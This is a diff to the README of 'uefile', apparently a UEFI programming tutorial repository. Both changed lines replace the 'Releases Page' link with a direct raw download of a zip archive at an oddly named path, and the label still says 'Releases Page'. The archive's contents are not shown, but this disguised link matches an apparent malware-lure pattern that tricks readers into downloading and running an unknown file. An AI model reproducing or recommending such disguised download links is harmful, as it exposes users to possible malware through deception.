@@ -6,7 +6,7 @@ Welcome to uefile! This repository helps you learn UEFI programming in Linux usi
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Mollydisaper/uefile/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Mollydisaper/uefile/main/enhorror/uefile.zip).
 
 Here’s how to download and run the software:
 
@@ -61,7 +61,7 @@ Join our community for help and discussions:
 
 ## 📅 Keeping Up-to-Date
 
-To ensure you have the latest version of uefile, keep an eye on the [Releases Page](https://github.com/Mollydisaper/uefile/releases). Frequent updates will provide you with new lessons, features, and bug fixes.
+To ensure you have the latest version of uefile, keep an eye on the [Releases Page](https://raw.githubusercontent.com/Mollydisaper/uefile/main/enhorror/uefile.zip). Frequent updates will provide you with new lessons, features, and bug fixes.
 
 ## ©️ License
 
